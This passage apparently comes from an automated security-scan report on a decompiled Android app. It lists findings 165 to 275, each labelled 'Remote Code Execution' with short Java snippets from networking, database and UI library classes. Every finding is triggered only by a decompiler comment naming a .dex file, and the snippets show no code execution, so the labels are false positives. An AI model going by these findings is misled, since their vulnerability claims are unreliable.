/* loaded from: classes22.dex */
public interface g<T> extends d<T> {
}

```

**165. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z2/k.java`
- **Line:** 7

```java
import java.util.List;
import java.util.Objects;

/* loaded from: classes5.dex */
public abstract class k<T, ID> {

    /* renamed from: h, reason: collision with root package name */
```

**166. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z2/l.java`
- **Line:** 9

```java
import java.util.HashMap;
import java.util.Objects;

/* loaded from: classes23.dex */
public final class l<T, ID> implements d<String[]> {

    /* renamed from: k, reason: collision with root package name */
```

**167. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z2/m.java`
- **Line:** 3

```java
package z2;

/* loaded from: classes18.dex */
public final class m<T, ID> {

    /* renamed from: a, reason: collision with root package name */
```

**168. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z2/a.java`
- **Line:** 3

```java
package z2;

/* loaded from: classes15.dex */
public interface a {
    Object a();

```

**169. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v0/b.java`
- **Line:** 5

```java

import android.os.Build;

/* loaded from: classes11.dex */
public final class b {
    public static boolean a() {
        return Build.VERSION.SDK_INT >= 26;
```

**170. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v0/a.java`
- **Line:** 7

```java
import android.content.Context;
import android.os.Build;

/* loaded from: classes19.dex */
public final class a {

    /* renamed from: a, reason: collision with root package name */
```

**171. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/y3/b.java`
- **Line:** 27

```java
import w3.j;
import x3.j;

/* loaded from: classes21.dex */
public final class b implements x3.d {

    /* renamed from: a, reason: collision with root package name */
```

**172. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/y3/b.java`
- **Line:** 51

```java
    /* renamed from: g, reason: collision with root package name */
    public final g f6079g;

    /* loaded from: classes22.dex */
    public abstract class a implements a0 {

        /* renamed from: b, reason: collision with root package name */
```

**173. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/y3/b.java`
- **Line:** 99

```java
    }

    /* renamed from: y3.b$b, reason: collision with other inner class name */
    /* loaded from: classes5.dex */
    public final class C0087b implements y {

        /* renamed from: b, reason: collision with root package name */
```

**174. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/y3/b.java`
- **Line:** 152

```java
        }
    }

    /* loaded from: classes19.dex */
    public final class c extends a {

        /* renamed from: e, reason: collision with root package name */
```

**175. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/y3/b.java`
- **Line:** 257

```java
        }
    }

    /* loaded from: classes19.dex */
    public final class d extends a {

        /* renamed from: e, reason: collision with root package name */
```

**176. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/y3/a.java`
- **Line:** 8

```java
import kotlin.text.StringsKt;
import s3.r;

/* loaded from: classes3.dex */
public final class a {

    /* renamed from: a, reason: collision with root package name */
```

**177. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/b.java`
- **Line:** 7

```java
import kotlin.jvm.JvmField;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes3.dex */
public interface b {

    /* renamed from: a, reason: collision with root package name */
```

**178. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/a0.java`
- **Line:** 5

```java

import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes7.dex */
public final class a0 extends d1.f {

    /* renamed from: b, reason: collision with root package name */
```

**179. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/w.java`
- **Line:** 15

```java
import org.apache.commons.io.FileUtils;
import s3.o;

/* loaded from: classes9.dex */
public final class w implements Cloneable {
    public final int A;
    public final int B;
```

**180. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/w.java`
- **Line:** 100

```java
    public static final List<x> E = t3.c.m(x.HTTP_2, x.HTTP_1_1);
    public static final List<j> F = t3.c.m(j.f5235e, j.f5236f);

    /* loaded from: classes13.dex */
    public static final class a {
        public int A;
        public long B;
```

**181. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/w.java`
- **Line:** 212

```java
        }
    }

    /* loaded from: classes24.dex */
    public static final class b {
    }

```

**182. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/c0.java`
- **Line:** 3

```java
package s3;

/* loaded from: classes5.dex */
public final class c0 extends d0 {

    /* renamed from: b, reason: collision with root package name */
```

**183. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/n.java`
- **Line:** 8

```java
import k.j0;
import kotlin.jvm.JvmField;

/* loaded from: classes16.dex */
public interface n {

    /* renamed from: c, reason: collision with root package name */
```

**184. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/z.java`
- **Line:** 9

```java
import kotlin.io.CloseableKt;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes9.dex */
public final class z extends d1.f {

    /* renamed from: b, reason: collision with root package name */
```

**185. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/g0.java`
- **Line:** 3

```java
package s3;

/* loaded from: classes21.dex */
public interface g0 {
    boolean a(int i5, String str);

```

**186. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/o.java`
- **Line:** 7

```java
import kotlin.jvm.JvmField;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes19.dex */
public abstract class o {

    /* renamed from: a, reason: collision with root package name */
```

**187. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/o.java`
- **Line:** 14

```java
    @JvmField
    public static final a f5265a = new a();

    /* loaded from: classes3.dex */
    public static final class a extends o {
    }

```

**188. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/o.java`
- **Line:** 18

```java
    public static final class a extends o {
    }

    /* loaded from: classes11.dex */
    public interface b {
        o a(d dVar);
    }
```

**189. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/v.java`
- **Line:** 13

```java
import kotlin.text.Typography;
import s3.u;

/* loaded from: classes21.dex */
public final class v extends d1.f {

    /* renamed from: f, reason: collision with root package name */
```

**190. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/v.java`
- **Line:** 48

```java
    /* renamed from: e, reason: collision with root package name */
    public final List<b> f5316e;

    /* loaded from: classes17.dex */
    public static final class a {
        public final void a(StringBuilder appendQuotedString, String key) {
            String str;
```

**191. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/v.java`
- **Line:** 73

```java
        }
    }

    /* loaded from: classes2.dex */
    public static final class b {

        /* renamed from: c, reason: collision with root package name */
```

**192. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/v.java`
- **Line:** 85

```java
        /* renamed from: b, reason: collision with root package name */
        public final d1.f f5319b;

        /* loaded from: classes23.dex */
        public static final class a {
            @JvmStatic
            public final b a(String name, String str, d1.f body) {
```

**193. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/e0.java`
- **Line:** 7

```java
import java.net.Proxy;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes10.dex */
public final class e0 {

    /* renamed from: a, reason: collision with root package name */
```

**194. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/c.java`
- **Line:** 7

```java
import kotlin.jvm.internal.Intrinsics;
import kotlin.text.StringsKt__StringsKt;

/* loaded from: classes11.dex */
public final class c {

    /* renamed from: n, reason: collision with root package name */
```

**195. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/c.java`
- **Line:** 52

```java
    /* renamed from: m, reason: collision with root package name */
    public String f5193m;

    /* loaded from: classes15.dex */
    public static final class a {
        public final int a(String str, String str2, int i5) {
            boolean contains$default;
```

**196. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/h.java`
- **Line:** 12

```java
import kotlin.jvm.internal.Intrinsics;
import kotlin.text.StringsKt;

/* loaded from: classes11.dex */
public final class h {

    /* renamed from: b, reason: collision with root package name */
```

**197. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/h.java`
- **Line:** 91

```java
    /* renamed from: a, reason: collision with root package name */
    public final String f5234a;

    /* loaded from: classes12.dex */
    public static final class a implements Comparator<String> {
        /* JADX WARN: Code restructure failed: missing block: B:10:0x0030, code lost:
        
```

**198. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/h.java`
- **Line:** 146

```java
        }
    }

    /* loaded from: classes5.dex */
    public static final class b {
        public static final h a(b bVar, String str) {
            h hVar = new h(str);
```

**199. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/b0.java`
- **Line:** 8

```java
import kotlin.jvm.internal.Intrinsics;
import s3.r;

/* loaded from: classes22.dex */
public final class b0 implements Closeable {

    /* renamed from: b, reason: collision with root package name */
```

**200. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/b0.java`
- **Line:** 50

```java
    /* renamed from: n, reason: collision with root package name */
    public final w3.c f5166n;

    /* loaded from: classes25.dex */
    public static class a {

        /* renamed from: a, reason: collision with root package name */
```

**201. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/d.java`
- **Line:** 3

```java
package s3;

/* loaded from: classes17.dex */
public interface d extends Cloneable {
}

```

**202. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/q.java`
- **Line:** 22

```java
import kotlin.jvm.internal.Intrinsics;
import kotlin.jvm.internal.Lambda;

/* loaded from: classes12.dex */
public final class q {

    /* renamed from: e, reason: collision with root package name */
```

**203. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/q.java`
- **Line:** 40

```java
    /* renamed from: d, reason: collision with root package name */
    public final List<Certificate> f5276d;

    /* loaded from: classes21.dex */
    public static final class a {

        /* renamed from: s3.q$a$a, reason: collision with other inner class name */
```

**204. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/q.java`
- **Line:** 44

```java
    public static final class a {

        /* renamed from: s3.q$a$a, reason: collision with other inner class name */
        /* loaded from: classes20.dex */
        public static final class C0066a extends Lambda implements Function0<List<? extends Certificate>> {

            /* renamed from: b, reason: collision with root package name */
```

**205. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/q.java`
- **Line:** 95

```java
        }
    }

    /* loaded from: classes6.dex */
    public static final class b extends Lambda implements Function0<List<? extends Certificate>> {

        /* renamed from: b, reason: collision with root package name */
```

**206. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/p.java`
- **Line:** 10

```java
import kotlin.jvm.internal.Intrinsics;
import s3.s;

/* loaded from: classes18.dex */
public final class p extends d1.f {

    /* renamed from: d, reason: collision with root package name */
```

**207. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/p.java`
- **Line:** 22

```java
    /* renamed from: c, reason: collision with root package name */
    public final List<String> f5268c;

    /* loaded from: classes16.dex */
    public static final class a {

        /* renamed from: c, reason: collision with root package name */
```

**208. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/d0.java`
- **Line:** 8

```java
import kotlin.io.CloseableKt;
import kotlin.text.Charsets;

/* loaded from: classes4.dex */
public abstract class d0 implements Closeable {
    public abstract long a();

```

**209. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/e.java`
- **Line:** 5

```java

import java.io.IOException;

/* loaded from: classes23.dex */
public interface e {
    void a(d dVar, b0 b0Var);

```

**210. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/f0.java`
- **Line:** 6

```java
import kotlin.jvm.JvmStatic;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes4.dex */
public enum f0 {
    TLS_1_3("TLSv1.3"),
    TLS_1_2("TLSv1.2"),
```

**211. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/f0.java`
- **Line:** 21

```java
    /* renamed from: b, reason: collision with root package name */
    public final String f5211b;

    /* loaded from: classes9.dex */
    public static final class a {
        /* JADX WARN: Failed to restore switch over string. Please report as a decompilation issue */
        @JvmStatic
```

**212. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/i.java`
- **Line:** 3

```java
package s3;

/* loaded from: classes23.dex */
public interface i {
}

```

**213. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/j.java`
- **Line:** 17

```java
import kotlin.jvm.internal.Intrinsics;
import s3.h;

/* loaded from: classes22.dex */
public final class j {

    /* renamed from: e, reason: collision with root package name */
```

**214. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/j.java`
- **Line:** 40

```java
    /* renamed from: d, reason: collision with root package name */
    public final String[] f5240d;

    /* loaded from: classes23.dex */
    public static final class a {

        /* renamed from: a, reason: collision with root package name */
```

**215. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/s.java`
- **Line:** 22

```java
import kotlin.text.Typography;
import org.apache.commons.io.IOUtils;

/* loaded from: classes19.dex */
public final class s {

    /* renamed from: a, reason: collision with root package name */
```

**216. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/s.java`
- **Line:** 58

```java
    /* renamed from: j, reason: collision with root package name */
    public static final char[] f5282j = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'};

    /* loaded from: classes22.dex */
    public static final class a {

        /* renamed from: a, reason: collision with root package name */
```

**217. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/s.java`
- **Line:** 219

```java
        }
    }

    /* loaded from: classes11.dex */
    public static final class b {
        /* JADX WARN: Removed duplicated region for block: B:90:0x01ae A[LOOP:2: B:88:0x01a8->B:90:0x01ae, LOOP_END] */
        /*
```

**218. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/f.java`
- **Line:** 23

```java
import kotlin.text.StringsKt;
import org.apache.commons.io.IOUtils;

/* loaded from: classes2.dex */
public final class f {

    /* renamed from: a, reason: collision with root package name */
```

**219. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/f.java`
- **Line:** 63

```java
        }
    }

    /* loaded from: classes16.dex */
    public static final class b {
        public final boolean equals(Object obj) {
            if (this == obj) {
```

**220. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/g.java`
- **Line:** 12

```java
import kotlin.jvm.functions.Function0;
import kotlin.jvm.internal.Lambda;

/* loaded from: classes16.dex */
public final class g extends Lambda implements Function0<List<? extends X509Certificate>> {

    /* renamed from: b, reason: collision with root package name */
```

**221. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/r.java`
- **Line:** 21

```java
import kotlin.ranges.RangesKt;
import kotlin.text.StringsKt;

/* loaded from: classes12.dex */
public final class r implements Iterable<Pair<? extends String, ? extends String>>, KMappedMarker {

    /* renamed from: c, reason: collision with root package name */
```

**222. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/r.java`
- **Line:** 30

```java
    /* renamed from: b, reason: collision with root package name */
    public final String[] f5280b;

    /* loaded from: classes11.dex */
    public static final class a {

        /* renamed from: a, reason: collision with root package name */
```

**223. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/r.java`
- **Line:** 83

```java
        }
    }

    /* loaded from: classes8.dex */
    public static final class b {
        public final void a(String str) {
            if (!(str.length() > 0)) {
```

**224. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/k.java`
- **Line:** 15

```java
import org.codehaus.mojo.animal_sniffer.IgnoreJRERequirement;
import x3.c;

/* loaded from: classes25.dex */
public final class k {

    /* renamed from: a, reason: collision with root package name */
```

**225. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/k.java`
- **Line:** 60

```java
    /* renamed from: m, reason: collision with root package name */
    public static final Pattern f5248m = Pattern.compile("(\\d{1,2}):(\\d{1,2}):(\\d{1,2})[^\\d]*");

    /* loaded from: classes20.dex */
    public static final class a {
        public final int a(String str, int i5, int i6, boolean z4) {
            while (i5 < i6) {
```

**226. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/u.java`
- **Line:** 14

```java
import kotlin.text.StringsKt;
import kotlin.text.Typography;

/* loaded from: classes14.dex */
public final class u {

    /* renamed from: a, reason: collision with root package name */
```

**227. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/u.java`
- **Line:** 35

```java
    /* renamed from: e, reason: collision with root package name */
    public static final Pattern f5302e = Pattern.compile(";\\s*(?:([a-zA-Z0-9-!#$%&'*+.^_`{|}~]+)=(?:([a-zA-Z0-9-!#$%&'*+.^_`{|}~]+)|\"([^\"]*)\"))?");

    /* loaded from: classes10.dex */
    public static final class a {
        @JvmStatic
        @JvmName(name = "get")
```

**228. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/y.java`
- **Line:** 15

```java
import s3.r;
import s3.s;

/* loaded from: classes23.dex */
public final class y {

    /* renamed from: a, reason: collision with root package name */
```

**229. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/y.java`
- **Line:** 36

```java
    /* renamed from: f, reason: collision with root package name */
    public final Map<Class<?>, Object> f5385f;

    /* loaded from: classes12.dex */
    public static class a {

        /* renamed from: a, reason: collision with root package name */
```

**230. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/l.java`
- **Line:** 6

```java
import java.util.List;
import kotlin.jvm.JvmField;

/* loaded from: classes20.dex */
public interface l {

    /* renamed from: b, reason: collision with root package name */
```

**231. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/m.java`
- **Line:** 9

```java
import kotlin.jvm.internal.Intrinsics;
import w3.e;

/* loaded from: classes8.dex */
public final class m {

    /* renamed from: a, reason: collision with root package name */
```

**232. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/x.java`
- **Line:** 7

```java
import kotlin.jvm.JvmStatic;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes19.dex */
public enum x {
    HTTP_1_0("http/1.0"),
    HTTP_1_1("http/1.1"),
```

**233. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/x.java`
- **Line:** 23

```java
    /* renamed from: b, reason: collision with root package name */
    public final String f5379b;

    /* loaded from: classes12.dex */
    public static final class a {
        @JvmStatic
        public final x a(String protocol) {
```

**234. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/a.java`
- **Line:** 14

```java
import kotlin.text.StringsKt;
import s3.s;

/* loaded from: classes22.dex */
public final class a {

    /* renamed from: a, reason: collision with root package name */
```

**235. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/t.java`
- **Line:** 3

```java
package s3;

/* loaded from: classes9.dex */
public interface t {

    /* loaded from: classes24.dex */
```

**236. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s3/t.java`
- **Line:** 6

```java
/* loaded from: classes9.dex */
public interface t {

    /* loaded from: classes24.dex */
    public interface a {
    }

```

**237. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/p2/b.java`
- **Line:** 16

```java
import java.util.concurrent.atomic.AtomicLong;
import java.util.regex.Pattern;

/* loaded from: classes14.dex */
public class b implements Closeable, Flushable {

    /* renamed from: k, reason: collision with root package name */
```

**238. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/p2/c.java`
- **Line:** 5

```java

import java.io.IOException;

/* loaded from: classes19.dex */
public final class c extends IOException {
    public c(String str) {
        super(str);
```

**239. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/p2/a.java`
- **Line:** 13

```java
import kotlin.text.Typography;
import org.apache.commons.io.FilenameUtils;

/* loaded from: classes12.dex */
public class a implements Closeable {

    /* renamed from: b, reason: collision with root package name */
```

**240. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/p2/a.java`
- **Line:** 62

```java
    public int f4659n = 0 + 1;

    /* renamed from: p2.a$a, reason: collision with other inner class name */
    /* loaded from: classes7.dex */
    public class C0059a extends f {
    }

```

**241. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/a4/b.java`
- **Line:** 28

```java
import kotlin.jvm.internal.Intrinsics;
import s3.x;

/* loaded from: classes23.dex */
public final class b extends h {

    /* renamed from: f, reason: collision with root package name */
```

**242. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/a4/b.java`
- **Line:** 43

```java
    /* renamed from: e, reason: collision with root package name */
    public final b4.h f91e;

    /* loaded from: classes21.dex */
    public static final class a {
    }

```

**243. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/a4/b.java`
- **Line:** 48

```java
    }

    /* renamed from: a4.b$b, reason: collision with other inner class name */
    /* loaded from: classes4.dex */
    public static final class C0001b implements d4.d {

        /* renamed from: a, reason: collision with root package name */
```

**244. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/a4/c.java`
- **Line:** 20

```java
import org.bouncycastle.jsse.provider.BouncyCastleJsseProvider;
import s3.x;

/* loaded from: classes20.dex */
public final class c extends h {

    /* renamed from: e, reason: collision with root package name */
```

**245. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/a4/c.java`
- **Line:** 32

```java
    /* renamed from: d, reason: collision with root package name */
    public final Provider f96d = new BouncyCastleJsseProvider();

    /* loaded from: classes24.dex */
    public static final class a {
    }

```

**246. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/a4/h.java`
- **Line:** 25

```java
import kotlin.jvm.internal.Intrinsics;
import s3.x;

/* loaded from: classes2.dex */
public class h {

    /* renamed from: a, reason: collision with root package name */
```

**247. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/a4/h.java`
- **Line:** 37

```java
    /* renamed from: c, reason: collision with root package name */
    public static final a f116c;

    /* loaded from: classes25.dex */
    public static final class a {
        public final List<String> a(List<? extends x> protocols) {
            int collectionSizeOrDefault;
```

**248. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/a4/d.java`
- **Line:** 20

```java
import org.conscrypt.ConscryptHostnameVerifier;
import s3.x;

/* loaded from: classes15.dex */
public final class d extends h {

    /* renamed from: e, reason: collision with root package name */
```

**249. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/a4/d.java`
- **Line:** 32

```java
    /* renamed from: d, reason: collision with root package name */
    public final Provider f99d;

    /* loaded from: classes5.dex */
    public static final class a {
        public final boolean a() {
            Conscrypt.Version version = Conscrypt.version();
```

**250. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/a4/d.java`
- **Line:** 40

```java
        }
    }

    /* loaded from: classes5.dex */
    public static final class b implements ConscryptHostnameVerifier {

        /* renamed from: a, reason: collision with root package name */
```

**251. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/a4/e.java`
- **Line:** 14

```java
import kotlin.jvm.internal.Intrinsics;
import s3.x;

/* loaded from: classes11.dex */
public final class e extends h {

    /* renamed from: d, reason: collision with root package name */
```

**252. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/a4/e.java`
- **Line:** 32

```java
    /* renamed from: h, reason: collision with root package name */
    public final Class<?> f105h;

    /* loaded from: classes20.dex */
    public static final class a implements InvocationHandler {

        /* renamed from: b, reason: collision with root package name */
```

**253. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/a4/f.java`
- **Line:** 11

```java
import kotlin.jvm.internal.Intrinsics;
import s3.x;

/* loaded from: classes22.dex */
public final class f extends h {

    /* renamed from: d, reason: collision with root package name */
```

**254. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/a4/f.java`
- **Line:** 20

```java
    /* renamed from: e, reason: collision with root package name */
    public static final a f110e = new a();

    /* loaded from: classes17.dex */
    public static final class a {
    }

```

**255. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/a4/g.java`
- **Line:** 19

```java
import org.openjsse.net.ssl.OpenJSSE;
import s3.x;

/* loaded from: classes19.dex */
public final class g extends h {

    /* renamed from: e, reason: collision with root package name */
```

**256. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/a4/g.java`
- **Line:** 31

```java
    /* renamed from: d, reason: collision with root package name */
    public final Provider f113d = new OpenJSSE();

    /* loaded from: classes24.dex */
    public static final class a {
    }

```

**257. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/a4/a.java`
- **Line:** 20

```java
import kotlin.jvm.internal.Intrinsics;
import s3.x;

/* loaded from: classes22.dex */
public final class a extends h {

    /* renamed from: e, reason: collision with root package name */
```

**258. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/a4/a.java`
- **Line:** 33

```java
    public final List<k> f87d;

    /* renamed from: a4.a$a, reason: collision with other inner class name */
    /* loaded from: classes7.dex */
    public static final class C0000a {
    }

```

**259. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/a3/b.java`
- **Line:** 3

```java
package a3;

/* loaded from: classes3.dex */
public abstract class b<T, ID> {

    /* renamed from: f, reason: collision with root package name */
```

**260. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/a3/c.java`
- **Line:** 7

```java
import java.util.Objects;
import x2.b;

/* loaded from: classes5.dex */
public final class c<T, ID> extends b<T, ID> {

    /* renamed from: i, reason: collision with root package name */
```

**261. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/a3/c.java`
- **Line:** 19

```java
    /* renamed from: h, reason: collision with root package name */
    public int f76h;

    /* loaded from: classes23.dex */
    public static class a implements c3.f {

        /* renamed from: a, reason: collision with root package name */
```

**262. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/a3/d.java`
- **Line:** 3

```java
package a3;

/* loaded from: classes4.dex */
public final class d<T, ID> extends b<T, ID> {

    /* renamed from: g, reason: collision with root package name */
```

**263. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/a3/e.java`
- **Line:** 6

```java
import java.sql.SQLException;
import x2.b;

/* loaded from: classes15.dex */
public final class e<T, ID> extends a<T, ID> implements z2.f<T>, z2.e<T>, z2.g {

    /* renamed from: k, reason: collision with root package name */
```

**264. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/a3/f.java`
- **Line:** 9

```java
import t2.m;
import x2.b;

/* loaded from: classes16.dex */
public final class f<T, ID> extends a<T, ID> {
    public f(d3.c cVar, String str, v2.g[] gVarArr, v2.g[] gVarArr2) {
        super(cVar, str, gVarArr, gVarArr2);
```

**265. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/a3/g.java`
- **Line:** 3

```java
package a3;

/* loaded from: classes10.dex */
public final class g<T, ID> extends b<T, ID> {

    /* renamed from: i, reason: collision with root package name */
```

**266. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/a3/a.java`
- **Line:** 10

```java
import t2.m;
import v2.g;

/* loaded from: classes23.dex */
public abstract class a<T, ID> extends b<T, ID> implements z2.d<T> {

    /* renamed from: g, reason: collision with root package name */
```

**267. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/m1/a.java`
- **Line:** 10

```java
import androidx.annotation.NonNull;
import com.google.android.material.chip.Chip;

/* loaded from: classes15.dex */
public final class a extends ViewOutlineProvider {

    /* renamed from: a, reason: collision with root package name */
```

**268. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/b2/b.java`
- **Line:** 9

```java
import java.util.Arrays;

@RestrictTo({RestrictTo.Scope.LIBRARY_GROUP})
/* loaded from: classes25.dex */
public final class b implements c {

    /* renamed from: a, reason: collision with root package name */
```

**269. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/b2/n.java`
- **Line:** 5

```java

import androidx.annotation.NonNull;

/* loaded from: classes5.dex */
public interface n {
    void setShapeAppearanceModel(@NonNull k kVar);
}
```

**270. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/b2/c.java`
- **Line:** 6

```java
import android.graphics.RectF;
import androidx.annotation.NonNull;

/* loaded from: classes18.dex */
public interface c {
    float a(@NonNull RectF rectF);
}
```

**271. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/b2/h.java`
- **Line:** 9

```java
import androidx.core.view.ViewCompat;
import b2.g;

/* loaded from: classes3.dex */
public final class h {
    @NonNull
    public static d a(int i5) {
```

**272. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/b2/d.java`
- **Line:** 5

```java

import androidx.annotation.NonNull;

/* loaded from: classes18.dex */
public class d {
    public void a(@NonNull m mVar, float f5, float f6) {
        throw null;
```

**273. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/b2/e.java`
- **Line:** 5

```java

import androidx.annotation.NonNull;

/* loaded from: classes24.dex */
public final class e extends d {
    @Override // b2.d
    public final void a(@NonNull m mVar, float f5, float f6) {
```

**274. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/b2/i.java`
- **Line:** 8

```java
import androidx.annotation.NonNull;
import java.util.Arrays;

/* loaded from: classes3.dex */
public final class i implements c {

    /* renamed from: a, reason: collision with root package name */
```

**275. Remote Code Execution**
- **Description:** Pattern detected: .dex
